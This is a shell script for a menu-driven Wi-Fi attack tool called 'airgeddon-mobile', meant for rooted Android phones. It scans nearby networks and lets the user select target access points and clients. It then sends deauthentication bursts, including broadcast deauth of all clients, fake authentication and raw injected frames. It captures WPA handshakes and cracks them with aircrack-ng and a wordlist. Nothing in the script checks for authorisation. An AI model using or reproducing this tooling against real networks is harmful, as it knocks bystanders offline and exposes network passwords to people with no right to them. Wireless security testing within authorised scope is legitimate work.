#!/bin/sh
# airgeddon-mobile: Lightweight, Mobile-Optimized Wireless Auditing Suite
# Tailored for Realme Narzo 30A (MediaTek MT6768) & Android Devices
# Built to work directly on mobile screens (Termux / ADB / Root Shell)

export PATH="/data/adb/modules/mtk-aircrack-core/system/bin:/system/xbin:/data/data/com.termux/files/usr/bin:/system_ext/bin:/system/bin:/vendor/bin:$PATH"
export LD_LIBRARY_PATH="/data/data/com.termux/files/usr/lib:$LD_LIBRARY_PATH"
export TERM="${TERM:-xterm-256color}"

# Colors
C_RED="\033[1;31m"
C_GRN="\033[1;32m"
C_YLW="\033[1;33m"
C_BLU="\033[1;34m"
C_MAG="\033[1;35m"
C_CYN="\033[1;36m"
C_WHT="\033[1;37m"
C_DIM="\033[2m"
C_RST="\033[0m"

# State variables
SELECTED_BSSID=""
SELECTED_ESSID=""
SELECTED_CH="1"
SELECTED_CLIENT="ff:ff:ff:ff:ff:ff"
TARGETS_FILE="/data/local/tmp/airgeddon_targets.txt"
CLIENTS_FILE="/data/local/tmp/airgeddon_clients.txt"
HANDSHAKE_DIR="/sdcard/airgeddon_captures"
mkdir -p "$HANDSHAKE_DIR" 2>/dev/null || HANDSHAKE_DIR="/data/local/tmp/airgeddon_captures"
mkdir -p "$HANDSHAKE_DIR" 2>/dev/null

check_root() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${C_RED}[-] Error: airgeddon-mobile must be run as root (su).${C_RST}" >&2
        exit 1
    fi
}

# Direct CLI flag: airgeddon-mobile --airodump
if [ "$1" = "--airodump" ] || [ "$1" = "--scan" ] || [ "$1" = "-s" ]; then
    check_root
    m_iface=$(ip link show mon0 >/dev/null 2>&1 && echo "mon0" || ip link show wlan0mon >/dev/null 2>&1 && echo "wlan0mon" || echo "")
    if [ -z "$m_iface" ]; then
        echo -e "${C_CYN}[*] Initializing monitor mode...${C_RST}"
        airmon-mtk start >/dev/null 2>&1
    fi
    shift
    exec airmon-sniff --airodump "$@"
fi

get_mon_iface() {
    if ip link show mon0 >/dev/null 2>&1; then
        echo "mon0"
    elif ip link show wlan0mon >/dev/null 2>&1; then
        echo "wlan0mon"
    elif ip link show radiotap0 >/dev/null 2>&1; then
        echo "radiotap0"
    else
        echo ""
    fi
}

get_active_channel() {
    if [ -f "/data/local/tmp/airmon_mtk_hop.pid" ] && kill -0 "$(cat /data/local/tmp/airmon_mtk_hop.pid 2>/dev/null)" 2>/dev/null; then
        echo "HOPPING (1-13)"
    elif [ -f "/data/local/tmp/airmon_channel" ]; then
        cat /data/local/tmp/airmon_channel 2>/dev/null
    else
        echo "1"
    fi
}

get_tx_stats() {
    local iface="$1"
    [ -z "$iface" ] && return
    ip -s link show "$iface" 2>/dev/null | awk '/TX:/{getline; print $1"B / "$2" pkts"}'
}

get_rx_stats() {
    local iface="$1"
    [ -z "$iface" ] && return
    ip -s link show "$iface" 2>/dev/null | awk '/RX:/{getline; print $1"B / "$2" pkts"}'
}

print_header() {
    clear
    local mon_dev
    mon_dev=$(get_mon_iface)
    local cur_ch
    cur_ch=$(get_active_channel)

    echo -e "${C_CYN}==============================================================${C_RST}"
    echo -e "${C_WHT}           AIRGEDDON MOBILE  ${C_CYN}[MediaTek MT6768]${C_RST}"
    echo -e "${C_DIM}     Lightweight 802.11 Auditing Suite for Android${C_RST}"
    echo -e "${C_CYN}==============================================================${C_RST}"
    
    if [ -n "$mon_dev" ]; then
        local tx_stat
        tx_stat=$(get_tx_stats "$mon_dev")
        echo -e " ${C_GRN}[●] Monitor Mode:${C_RST} ${C_WHT}$mon_dev (ACTIVE)${C_RST}  | ${C_CYN}CH:${C_RST} ${C_YLW}$cur_ch${C_RST}"
        echo -e " ${C_GRN}[↑] TX Packets:${C_RST}   ${C_WHT}${tx_stat:-0 pkts}${C_RST} (Injection Ready)"
    else
        echo -e " ${C_RED}[○] Monitor Mode:${C_RST} ${C_DIM}INACTIVE (wlan0 managed)${C_RST}"
    fi

    if [ -n "$SELECTED_BSSID" ]; then
        echo -e " ${C_MAG}[★] Target AP:${C_RST}    ${C_WHT}$SELECTED_ESSID${C_RST} [${C_YLW}$SELECTED_BSSID${C_RST}] CH: ${C_GRN}$SELECTED_CH${C_RST}"
        [ -n "$SELECTED_CLIENT" ] && [ "$SELECTED_CLIENT" != "ff:ff:ff:ff:ff:ff" ] && echo -e " ${C_MAG}[★] Target Client:${C_RST}${C_WHT} $SELECTED_CLIENT${C_RST}"
    fi
    echo -e "${C_CYN}--------------------------------------------------------------${C_RST}"
}

pause() {
    echo ""
    echo -en "${C_DIM}Press [Enter] to continue...${C_RST}"
    read -r _
}

# Module 1: Monitor & Radio Control
menu_radio_control() {
    while true; do
        print_header
        echo -e "${C_WHT}--- [1] Monitor Mode & Radio Control ---${C_RST}"
        echo -e " ${C_CYN}1)${C_RST} Start Monitor Mode (mon0)"
        echo -e " ${C_CYN}2)${C_RST} Stop Monitor Mode (restore wlan0)"
        echo -e " ${C_CYN}3)${C_RST} Switch Channel (1-14, 36-165)"
        echo -e " ${C_CYN}4)${C_RST} Toggle Channel Hopper (1-13 continuous sweep)"
        echo -e " ${C_CYN}5)${C_RST} Wake Radio / Refresh Power Lock"
        echo -e " ${C_CYN}0)${C_RST} Back to Main Menu"
        echo ""
        echo -en "${C_YLW}Select option [0-5]: ${C_RST}"
        read -r choice
        case "$choice" in
            1)
                echo -e "\n${C_CYN}[*] Starting monitor mode...${C_RST}"
                airmon-mtk start
                pause
                ;;
            2)
                echo -e "\n${C_CYN}[*] Stopping monitor mode and restoring Android Wi-Fi...${C_RST}"
                airmon-mtk stop
                pause
                ;;
            3)
                echo -en "\n${C_YLW}Enter channel number (1-14 for 2.4GHz, 36-165 for 5GHz): ${C_RST}"
                read -r ch
                if [ -n "$ch" ]; then
                    airmon-mtk channel "$ch"
                    SELECTED_CH="$ch"
                fi
                pause
                ;;
            4)
                if [ -f "/data/local/tmp/airmon_mtk_hop.pid" ] && kill -0 "$(cat /data/local/tmp/airmon_mtk_hop.pid 2>/dev/null)" 2>/dev/null; then
                    echo -e "\n${C_CYN}[*] Stopping channel hopper...${C_RST}"
                    airmon-mtk stop-hop
                else
                    echo -e "\n${C_CYN}[*] Starting high-speed channel hopper...${C_RST}"
                    airmon-mtk hop 0.15
                fi
                pause
                ;;
            5)
                echo -e "\n${C_CYN}[*] Acquiring wake lock & disabling Wi-Fi power save...${C_RST}"
                iw dev wlan0 set power_save off 2>/dev/null
                echo "airmon_wake" > /sys/power/wake_lock 2>/dev/null
                echo -e "${C_GRN}[+] Radio wake lock held.${C_RST}"
                pause
                ;;
            0)
                break
                ;;
            *)
                echo -e "${C_RED}[!] Invalid choice.${C_RST}"
                sleep 1
                ;;
        esac
    done
}

# --- Target Recon & Selection Engine ---

parse_scan_csv() {
    local csv="$1"
    [ ! -f "$csv" ] && return 1

    local awk_script="/data/local/tmp/airgeddon_parse.awk"
    cat << 'EOF' > "$awk_script"
BEGIN { in_ap=0; in_sta=0 }
/BSSID, First time seen/ { in_ap=1; in_sta=0; next }
/Station MAC/ { in_ap=0; in_sta=1; next }
in_ap && NF >= 14 {
    bssid=$1; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", bssid);
    ch=$4; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", ch);
    pwr=$9; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", pwr);
    enc=$6; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", enc);
    essid=$14; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", essid);
    if ((ch + 0 > 0 || length(essid) > 0) && length(bssid) == 17) {
        printf "AP|%s|%s|%s|%s|%s\n", bssid, ch, pwr, enc, essid;
    }
}
in_sta && NF >= 6 {
    sta=$1; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", sta);
    bssid=$6; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", bssid);
    pwr=$4; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", pwr);
    pkts=$5; gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", pkts);
    if (length(sta) == 17) {
        printf "STA|%s|%s|%s|%s\n", sta, bssid, pwr, pkts;
    }
}
EOF

    awk -F, -f "$awk_script" "$csv" | grep '^AP|' | cut -d'|' -f2- > "$TARGETS_FILE" 2>/dev/null
    awk -F, -f "$awk_script" "$csv" | grep '^STA|' | cut -d'|' -f2- > "$CLIENTS_FILE" 2>/dev/null
    rm -f "$awk_script" 2>/dev/null
}

get_client_count() {
    local bssid="$1"
    [ ! -s "$CLIENTS_FILE" ] && echo "0" && return
    grep -c -i "|$bssid|" "$CLIENTS_FILE" 2>/dev/null || echo "0"
}

select_client_station() {
    local bssid="$1"
    local sta_match="/data/local/tmp/airgeddon_matched_stas.txt"
    [ -f "$CLIENTS_FILE" ] && grep -i "|$bssid|" "$CLIENTS_FILE" > "$sta_match" 2>/dev/null

    if [ ! -s "$sta_match" ]; then
        SELECTED_CLIENT="ff:ff:ff:ff:ff:ff"
        return 0
    fi

    echo -e "\n${C_CYN}[*] Discovered Client Stations associated with $bssid:${C_RST}"
    echo -e " ${C_YLW}1)${C_RST} Broadcast ${C_DIM}(ff:ff:ff:ff:ff:ff - Deauth all clients)${C_RST}"
    local idx=2
    while IFS='|' read -r sta b pwr pkts; do
        printf " ${C_YLW}%d)${C_RST} %-18s [PWR: %4s dBm | Packets: %s]\n" "$idx" "$sta" "$pwr" "$pkts"
        idx=$((idx + 1))
    done < "$sta_match"
    echo -e " ${C_YLW}0)${C_RST} Keep default broadcast"
    echo -en "${C_YLW}Select target client station [1-$((idx - 1))]: ${C_RST}"
    read -r c_sel

    if [ "$c_sel" = "1" ] || [ -z "$c_sel" ] || [ "$c_sel" = "0" ]; then
        SELECTED_CLIENT="ff:ff:ff:ff:ff:ff"
    elif [ "$c_sel" -ge 2 ] 2>/dev/null && [ "$c_sel" -lt "$idx" ] 2>/dev/null; then
        local line_num=$((c_sel - 1))
        SELECTED_CLIENT=$(sed -n "${line_num}p" "$sta_match" | cut -d'|' -f1)
        echo -e "${C_GRN}[+] Target client set to: $SELECTED_CLIENT${C_RST}"
    fi
}

run_timed_scan() {
    local dur="${1:-10}"
    local mon_dev
    mon_dev=$(get_mon_iface)
    if [ -z "$mon_dev" ]; then
        echo -e "\n${C_CYN}[*] Starting monitor mode...${C_RST}"
        airmon-mtk start
        mon_dev=$(get_mon_iface)
    fi

    local scan_base="/data/local/tmp/airgeddon_scan"
    rm -f "${scan_base}"* 2>/dev/null

    echo -e "\n${C_CYN}[*] Launching AP & Client recon on $mon_dev ($dur seconds)...${C_RST}"
    local started_hop=0
    if [ ! -f "/data/local/tmp/airmon_mtk_hop.pid" ] || ! kill -0 "$(cat /data/local/tmp/airmon_mtk_hop.pid 2>/dev/null)" 2>/dev/null; then
        airmon-mtk hop 0.15 >/dev/null 2>&1
        started_hop=1
    fi

    local airodump_bin="/data/data/com.termux/files/usr/bin/airodump-ng"
    [ ! -x "$airodump_bin" ] && airodump_bin="$(command -v airodump-ng 2>/dev/null)"

    timeout "$dur" "$airodump_bin" "$mon_dev" --output-format csv -w "$scan_base" >/dev/null 2>&1
    [ "$started_hop" -eq 1 ] && airmon-mtk stop-hop >/dev/null 2>&1

    if [ -f "${scan_base}-01.csv" ]; then
        parse_scan_csv "${scan_base}-01.csv"
        return 0
    else
        echo -e "${C_RED}[-] No scan data received.${C_RST}"
        return 1
    fi
}

select_target_ap() {
    local filter="$1"

    # If targets file doesn't exist or is empty, try to find any existing scan CSV or offer to scan
    if [ ! -s "$TARGETS_FILE" ]; then
        local any_csv
        any_csv=$(ls -1t /data/local/tmp/*.csv 2>/dev/null | grep -v 'kismet\|log' | head -n 1)
        if [ -n "$any_csv" ] && [ -f "$any_csv" ]; then
            parse_scan_csv "$any_csv"
        fi
    fi

    if [ ! -s "$TARGETS_FILE" ]; then
        echo -e "\n${C_YLW}[!] No target APs discovered yet.${C_RST}"
        echo -en "${C_YLW}Run a 10-second background recon scan now? [Y/n]: ${C_RST}"
        read -r do_scan
        case "$do_scan" in
            n*|N*)
                return 1
                ;;
            *)
                run_timed_scan 10
                ;;
        esac
    fi

    if [ ! -s "$TARGETS_FILE" ]; then
        echo -e "${C_RED}[-] Still no targets found. Please check radio or location.${C_RST}"
        pause
        return 1
    fi

    while true; do
        local display_file="/data/local/tmp/airgeddon_display_targets.txt"
        
        if [ -n "$filter" ]; then
            grep -i "$filter" "$TARGETS_FILE" > "$display_file" 2>/dev/null
        else
            cp "$TARGETS_FILE" "$display_file"
        fi

        local total_targets
        total_targets=$(wc -l < "$display_file" 2>/dev/null || echo 0)

        print_header
        echo -e "${C_WHT}--- Discovered Wireless Targets (Selection & Search) ---${C_RST}"
        if [ -n "$filter" ]; then
            echo -e " ${C_YLW}[Filter active: \"$filter\" | $total_targets matching AP(s)]${C_RST}"
        else
            echo -e " ${C_CYN}[Total Discovered: $total_targets Access Points]${C_RST}"
        fi
        echo ""
        printf "${C_CYN}%-4s %-18s %-4s %-5s %-7s %-9s %-20s${C_RST}\n" "NUM" "BSSID" "CH" "PWR" "ENC" "CLIENTS" "ESSID"
        echo -e "${C_DIM}-------------------------------------------------------------------------${C_RST}"

        if [ "$total_targets" -eq 0 ]; then
            echo -e "${C_YLW} No targets matched query: \"$filter\"${C_RST}"
        else
            local idx=1
            while IFS='|' read -r bssid ch pwr enc essid; do
                local c_count
                c_count=$(get_client_count "$bssid")
                local c_str="--"
                [ "$c_count" -gt 0 ] && c_str="${c_count} STAs"
                [ -z "$essid" ] && essid="<hidden/unnamed>"

                printf "${C_YLW}%-4d${C_RST} %-18s ${C_GRN}%-4s${C_RST} %-5s %-7s %-9s ${C_WHT}%-20s${C_RST}\n" \
                    "$idx" "$bssid" "$ch" "$pwr" "$enc" "$c_str" "$essid"
                idx=$((idx + 1))
            done < "$display_file"
        fi

        echo -e "${C_DIM}-------------------------------------------------------------------------${C_RST}"
        echo -e " ${C_DIM}Keys: [1-$total_targets] Select  | [s] Search/Filter  | [c] Clear Filter  | [r] Rescan  | [0] Back${C_RST}"
        echo -en "${C_YLW}Select AP target number or option: ${C_RST}"
        read -r user_in

        case "$user_in" in
            0|"")
                break
                ;;
            s|S)
                echo -en "\n${C_YLW}Enter network name (ESSID) or MAC to search for: ${C_RST}"
                read -r new_filter
                filter="$new_filter"
                ;;
            c|C)
                filter=""
                ;;
            r|R)
                run_timed_scan 10
                ;;
            *)
                if [ "$user_in" -gt 0 ] 2>/dev/null && [ "$user_in" -le "$total_targets" ] 2>/dev/null; then
                    local sel_line
                    sel_line=$(sed -n "${user_in}p" "$display_file")
                    SELECTED_BSSID=$(echo "$sel_line" | cut -d'|' -f1)
                    SELECTED_CH=$(echo "$sel_line" | cut -d'|' -f2)
                    SELECTED_ESSID=$(echo "$sel_line" | cut -d'|' -f5)
                    [ -z "$SELECTED_ESSID" ] && SELECTED_ESSID="<unnamed>"

                    echo -e "\n${C_GRN}[+] Target selected: $SELECTED_ESSID ($SELECTED_BSSID) on Channel $SELECTED_CH${C_RST}"
                    echo -e "${C_CYN}[*] Tuning monitor radio to Channel $SELECTED_CH...${C_RST}"
                    airmon-mtk channel "$SELECTED_CH" >/dev/null 2>&1

                    select_client_station "$SELECTED_BSSID"
                    pause
                    return 0
                else
                    echo -e "${C_RED}[!] Invalid selection.${C_RST}"
                    sleep 1
                fi
                ;;
        esac
    done
}

ensure_target_selected() {
    if [ -n "$SELECTED_BSSID" ]; then
        echo -e "\n${C_MAG}[★] Current Target:${C_RST} ${C_WHT}$SELECTED_ESSID${C_RST} [${C_YLW}$SELECTED_BSSID${C_RST}] CH: ${C_GRN}$SELECTED_CH${C_RST}"
        echo -en "${C_YLW}Use current target? [Y/n/change]: ${C_RST}"
        read -r t_conf
        case "$t_conf" in
            n*|N*|c*|C*)
                select_target_ap
                ;;
            *)
                return 0
                ;;
        esac
    else
        echo -e "\n${C_YLW}[!] No target AP currently selected.${C_RST}"
        select_target_ap
    fi
}

# Module 2: Network Scanner (AP Recon & Selection)
menu_network_scanner() {
    local mon_dev
    mon_dev=$(get_mon_iface)
    if [ -z "$mon_dev" ]; then
        echo -e "\n${C_RED}[!] Monitor interface not active. Starting it now...${C_RST}"
        airmon-mtk start
        mon_dev=$(get_mon_iface)
    fi

    while true; do
        print_header
        echo -e "${C_WHT}--- [2] Target Network Recon (Scanner & Selection) ---${C_RST}"
        echo -e " ${C_CYN}1)${C_RST} Live Airodump-ng Screen (Interactive real-time monitor -> Pick on exit)"
        echo -e " ${C_CYN}2)${C_RST} Quick Timed Recon Scan (10s auto-sweep -> Pick target)"
        echo -e " ${C_CYN}3)${C_RST} Search Targets by Name (SSID) / Filter"
        echo -e " ${C_CYN}4)${C_RST} Select Target from Last Scan Results"
        echo -e " ${C_CYN}5)${C_RST} Select / Switch Connected Client Station"
        echo -e " ${C_CYN}6)${C_RST} Manually Enter Target AP (BSSID, ESSID, Channel)"
        echo -e " ${C_CYN}0)${C_RST} Back to Main Menu"
        echo ""
        echo -en "${C_YLW}Select option [0-6]: ${C_RST}"
        read -r s_choice

        case "$s_choice" in
            1)
                local scan_base="/data/local/tmp/airgeddon_scan"
                rm -f "${scan_base}"* 2>/dev/null
                echo -e "\n${C_CYN}[*] Launching live interactive airodump-ng screen...${C_RST}"
                echo -e "${C_DIM}    Press Ctrl+C when finished to select your target AP.${C_RST}\n"
                sleep 1
                airmon-sniff --airodump -w "$scan_base"
                if [ -f "${scan_base}-01.csv" ]; then
                    parse_scan_csv "${scan_base}-01.csv"
                    echo -en "\n${C_YLW}Select target AP from this scan now? [Y/n]: ${C_RST}"
                    read -r sel_now
                    case "$sel_now" in
                        n*|N*) ;;
                        *) select_target_ap ;;
                    esac
                else
                    pause
                fi
                ;;
            2)
                run_timed_scan 10
                select_target_ap
                ;;
            3)
                echo -en "\n${C_YLW}Enter network name (ESSID) or MAC query to search: ${C_RST}"
                read -r s_query
                select_target_ap "$s_query"
                ;;
            4)
                select_target_ap
                ;;
            5)
                if [ -z "$SELECTED_BSSID" ]; then
                    echo -e "\n${C_YLW}[!] Please select a target AP first.${C_RST}"
                    select_target_ap
                fi
                [ -n "$SELECTED_BSSID" ] && select_client_station "$SELECTED_BSSID"
                pause
                ;;
            6)
                echo -en "\n${C_YLW}Enter Target AP BSSID (e.g. 0E:91:AB:FF:20:48): ${C_RST}"
                read -r man_bssid
                if [ -n "$man_bssid" ]; then
                    SELECTED_BSSID="$man_bssid"
                    echo -en "${C_YLW}Enter Target ESSID / Name (optional): ${C_RST}"
                    read -r man_essid
                    SELECTED_ESSID="${man_essid:-<custom>}"
                    echo -en "${C_YLW}Enter Target Channel (1-14 / 36-165, default 1): ${C_RST}"
                    read -r man_ch
                    SELECTED_CH="${man_ch:-1}"
                    airmon-mtk channel "$SELECTED_CH" >/dev/null 2>&1
                    echo -e "\n${C_GRN}[+] Target set to: $SELECTED_ESSID ($SELECTED_BSSID) on CH $SELECTED_CH.${C_RST}"
                fi
                pause
                ;;
            0)
                break
                ;;
            *)
                echo -e "${C_RED}[!] Invalid choice.${C_RST}"
                sleep 1
                ;;
        esac
    done
}

# Module 3: Packet Sniffer & Handshake Grabber
menu_packet_sniffer() {
    local mon_dev
    mon_dev=$(get_mon_iface)
    if [ -z "$mon_dev" ]; then
        echo -e "\n${C_RED}[!] Monitor interface not active.${C_RST}"
        pause
        return
    fi

    while true; do
        print_header
        echo -e "${C_WHT}--- [3] Packet Sniffer & Handshake Capture ---${C_RST}"
        echo -e " ${C_CYN}1)${C_RST} Live Packet Stream (All frames on current channel)"
        echo -e " ${C_CYN}2)${C_RST} Capture WPA/WPA2 4-Way Handshake (EAPOL filter)"
        echo -e " ${C_CYN}3)${C_RST} Filter by Target AP ($SELECTED_BSSID)"
        echo -e " ${C_CYN}4)${C_RST} Save Raw Capture to PCAP File"
        echo -e " ${C_CYN}0)${C_RST} Back to Main Menu"
        echo ""
        echo -en "${C_YLW}Select option [0-4]: ${C_RST}"
        read -r choice
        case "$choice" in
            1)
                echo -e "\n${C_CYN}[*] Starting live packet sniffer (Press Ctrl+C to return)...${C_RST}"
                airmon-sniff
                pause
                ;;
            2)
                ensure_target_selected || { pause; continue; }
                local pcap_out="$HANDSHAKE_DIR/handshake_${SELECTED_ESSID:-capture}_$(date +%s).pcap"
                echo -e "\n${C_CYN}[*] Listening for WPA 4-way handshakes (EAPOL proto 0x888e)...${C_RST}"
                echo -e "${C_YLW}[*] Target AP: $SELECTED_ESSID ($SELECTED_BSSID) on Channel $SELECTED_CH${C_RST}"
                echo -e "${C_YLW}[*] Output PCAP: $pcap_out${C_RST}"
                airmon-sniff -c "$SELECTED_CH" -b "$SELECTED_BSSID" --eapol -w "$pcap_out"
                echo -e "\n${C_GRN}[+] Capture saved to: $pcap_out${C_RST}"
                pause
                ;;
            3)
                ensure_target_selected || { pause; continue; }
                echo -e "\n${C_CYN}[*] Sniffing frames for BSSID $SELECTED_BSSID on Channel $SELECTED_CH...${C_RST}"
                airmon-sniff -c "$SELECTED_CH" -b "$SELECTED_BSSID"
                pause
                ;;
            4)
                echo -en "\n${C_YLW}Enter destination PCAP filename (default: /sdcard/capture.pcap): ${C_RST}"
                read -r fname
                fname="${fname:-/sdcard/capture.pcap}"
                echo -e "${C_CYN}[*] Capturing all 802.11 packets to $fname (Ctrl+C to stop)...${C_RST}"
                airmon-sniff -w "$fname"
                echo -e "\n${C_GRN}[+] PCAP saved to $fname.${C_RST}"
                pause
                ;;
            0)
                break
                ;;
            *)
                echo -e "${C_RED}[!] Invalid choice.${C_RST}"
                sleep 1
                ;;
        esac
    done
}

# Module 4: Packet Injector / Sender
menu_packet_sender() {
    local mon_dev
    mon_dev=$(get_mon_iface)
    if [ -z "$mon_dev" ]; then
        echo -e "\n${C_RED}[!] Monitor interface not active.${C_RST}"
        pause
        return
    fi

    while true; do
        print_header
        echo -e "${C_WHT}--- [4] Packet Injector & Frame Transmitter ---${C_RST}"
        echo -e " ${C_CYN}1)${C_RST} Probe Request / Hardware Injection Test"
        echo -e " ${C_CYN}2)${C_RST} Transmit Deauthentication Frame Burst"
        echo -e " ${C_CYN}3)${C_RST} Fake Authentication Association Test"
        echo -e " ${C_CYN}4)${C_RST} Send Custom Raw 802.11 Hex Frame"
        echo -e " ${C_CYN}0)${C_RST} Back to Main Menu"
        echo ""
        echo -en "${C_YLW}Select option [0-4]: ${C_RST}"
        read -r choice
        case "$choice" in
            1)
                echo -e "\n${C_CYN}[*] Executing injection test on $mon_dev...${C_RST}"
                if [ -n "$SELECTED_BSSID" ]; then
                    airmon-inject --test -a "$SELECTED_BSSID" -c "$SELECTED_CH"
                else
                    airmon-inject --test
                fi
                pause
                ;;
            2)
                ensure_target_selected || { pause; continue; }
                if [ -z "$SELECTED_CLIENT" ] || [ "$SELECTED_CLIENT" = "ff:ff:ff:ff:ff:ff" ]; then
                    local c_cnt
                    c_cnt=$(get_client_count "$SELECTED_BSSID")
                    if [ "$c_cnt" -gt 0 ]; then
                        echo -e "\n${C_CYN}[*] $c_cnt client station(s) discovered for this AP.${C_RST}"
                        echo -en "${C_YLW}Select a specific client station? [y/N (broadcast all)]: ${C_RST}"
                        read -r pick_sta
                        case "$pick_sta" in
                            y*|Y*) select_client_station "$SELECTED_BSSID" ;;
                            *) SELECTED_CLIENT="ff:ff:ff:ff:ff:ff" ;;
                        esac
                    else
                        SELECTED_CLIENT="ff:ff:ff:ff:ff:ff"
                    fi
                else
                    echo -e "\n${C_MAG}[★] Current Target Client:${C_RST} ${C_WHT}$SELECTED_CLIENT${C_RST}"
                    echo -en "${C_YLW}Use this client? [Y/n/change]: ${C_RST}"
                    read -r c_conf
                    case "$c_conf" in
                        n*|N*|c*|C*) select_client_station "$SELECTED_BSSID" ;;
                    esac
                fi

                echo -en "\n${C_YLW}Enter number of deauth frames to send (default: 10): ${C_RST}"
                read -r num_frames
                num_frames="${num_frames:-10}"

                echo -e "\n${C_CYN}[*] Sending $num_frames deauth frames to $SELECTED_BSSID (Client: ${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff})...${C_RST}"
                airmon-inject --deauth -a "$SELECTED_BSSID" -d "${SELECTED_CLIENT:-ff:ff:ff:ff:ff:ff}" -c "$SELECTED_CH" -n "$num_frames"
                pause
                ;;
            3)
                ensure_target_selected || { pause; continue; }
                echo -e "\n${C_CYN}[*] Sending Fake Authentication frame to $SELECTED_BSSID on Channel $SELECTED_CH...${C_RST}"
                airmon-inject --fakeauth -a "$SELECTED_BSSID" -c "$SELECTED_CH"
                pause
                ;;
            4)
                echo -en "\n${C_YLW}Enter raw 802.11 frame in hex: ${C_RST}"
                read -r hex_frame
                if [ -n "$hex_frame" ]; then
                    echo -en "${C_YLW}Frame count (default: 1): ${C_RST}"
                    read -r rcount
                    rcount="${rcount:-1}"
                    airmon-inject --raw "$hex_frame" -n "$rcount"
                fi
                pause
                ;;
            0)
                break
                ;;
            *)
                echo -e "${C_RED}[!] Invalid choice.${C_RST}"
                sleep 1
                ;;
        esac
    done
}

# Module 5: WPA Handshake Cracker
menu_handshake_cracker() {
    print_header
    echo -e "${C_WHT}--- [5] WPA/WPA2 Handshake Verifier & Cracker ---${C_RST}"

    echo -e "${C_CYN}[*] Listing available captures in $HANDSHAKE_DIR:${C_RST}"
    local pcap_list
    pcap_list=$(ls -1 "$HANDSHAKE_DIR"/*.pcap "$HANDSHAKE_DIR"/*.cap 2>/dev/null)
    if [ -z "$pcap_list" ]; then
        echo -e "${C_YLW}[!] No PCAP files found in $HANDSHAKE_DIR.${C_RST}"
        echo -en "${C_YLW}Enter path to custom .pcap / .cap file: ${C_RST}"
        read -r target_cap
    else
        local i=1
        for f in $pcap_list; do
            echo "  $i) $(basename "$f")"
            i=$((i + 1))
        done
        echo -en "${C_YLW}Select capture number [1-$((i - 1))] or enter full path: ${C_RST}"
        read -r cap_choice
        if [ "$cap_choice" -gt 0 ] 2>/dev/null && [ "$cap_choice" -lt "$i" ] 2>/dev/null; then
            target_cap=$(echo "$pcap_list" | sed -n "${cap_choice}p")
        else
            target_cap="$cap_choice"
        fi
    fi

    if [ ! -f "$target_cap" ]; then
        echo -e "${C_RED}[-] File not found: $target_cap${C_RST}"
        pause
        return
    fi

    echo -en "${C_YLW}Enter wordlist path (leave empty to verify handshake integrity only): ${C_RST}"
    read -r wordlist

    echo -e "\n${C_CYN}[*] Inspecting capture with aircrack-ng...${C_RST}"
    if [ -n "$wordlist" ] && [ -f "$wordlist" ]; then
        /data/data/com.termux/files/usr/bin/aircrack-ng -w "$wordlist" "$target_cap"
    else
        /data/data/com.termux/files/usr/bin/aircrack-ng "$target_cap"
    fi
    pause
}

# Main Event Loop
check_root

while true; do
    print_header
    echo -e "${C_WHT}Main Menu:${C_RST}"
    echo -e " ${C_CYN}[1]${C_RST} Monitor Mode & Radio Control"
    echo -e " ${C_CYN}[2]${C_RST} Target Network Recon (Scanner & Selection)"
    echo -e " ${C_CYN}[3]${C_RST} Packet Sniffer & Handshake Grabber"
    echo -e " ${C_CYN}[4]${C_RST} Packet Injector & Frame Transmitter"
    echo -e " ${C_CYN}[5]${C_RST} WPA/WPA2 Handshake Cracker & Verifier"
    echo -e " ${C_CYN}[6]${C_RST} Quick Diagnostics (PHY TX/RX Stats)"
    echo -e " ${C_MAG}[S]${C_RST} Search / Select Target AP (Fast Jump)"
    echo -e " ${C_CYN}[0]${C_RST} Exit & Restore System"
    echo ""
    echo -en "${C_YLW}Select option [0-6, or 's' to select target]: ${C_RST}"
    read -r opt
    case "$opt" in
        1)
            menu_radio_control
            ;;
        2)
            menu_network_scanner
            ;;
        3)
            menu_packet_sniffer
            ;;
        4)
            menu_packet_sender
            ;;
        5)
            menu_handshake_cracker
            ;;
        6)
            print_header
            echo -e "${C_WHT}--- Quick PHY Diagnostics ---${C_RST}"
            local mdev
            mdev=$(get_mon_iface)
            if [ -n "$mdev" ]; then
                ip -s link show "$mdev"
            else
                ip -s link show wlan0
            fi
            echo ""
            airmon-mtk status
            pause
            ;;
        s|S|t|T)
            select_target_ap
            ;;
        0)
            echo -e "\n${C_CYN}[*] Restoring system and cleaning up...${C_RST}"
            airmon-mtk stop >/dev/null 2>&1
            echo -e "${C_GRN}[+] Done. Thank you for using Airgeddon Mobile.${C_RST}\n"
            exit 0
            ;;
        *)
            echo -e "${C_RED}[!] Invalid choice.${C_RST}"
            sleep 1
            ;;
    esac
done
